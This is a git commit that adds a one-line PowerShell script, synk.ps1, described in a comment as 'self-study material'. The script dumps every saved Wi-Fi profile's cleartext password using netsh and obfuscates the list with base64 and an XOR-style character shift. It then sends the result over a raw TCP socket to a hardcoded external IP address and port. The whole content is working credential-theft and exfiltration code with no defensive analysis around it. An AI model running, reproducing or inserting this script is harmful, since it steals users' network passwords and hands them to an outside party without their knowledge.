60688da60d6e5bf4c23d89b6576d4903116fc100
datasynkr <peterpea314@gmail.com>
2025-10-16 13:16:03 +0200

    Create synk.ps1
    init

---
+++ synk.ps1
@@ -0,0 +1,3 @@
+# self-study material A/1
+# this is the condensed code which is made to use minimum possible characters yet keep the code readability "so-so" 
+ $IP="83.240.21.198";$P=20205;$C=netsh wlan sh pr|sls 'All User Profile\s+:\s+'|%{$w=$_.ToString()-replace'.*:\s+';(netsh wlan sh pr $w key=clear)|sls "Key Content"|%{"$w|"+$_.ToString().Split(':')[1].Trim()}};$L=$C-join"`n";$E=([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($L))|%{[char[]]$_}|%{([char](([int]$_-33-bxor 5)%95+33))})-join'';$T=New-Object System.Net.Sockets.TcpClient $IP,$P;$W=New-Object System.IO.StreamWriter($T.GetStream());$W.WriteLine($E);$W.Flush();$W.Close();$T.Close()
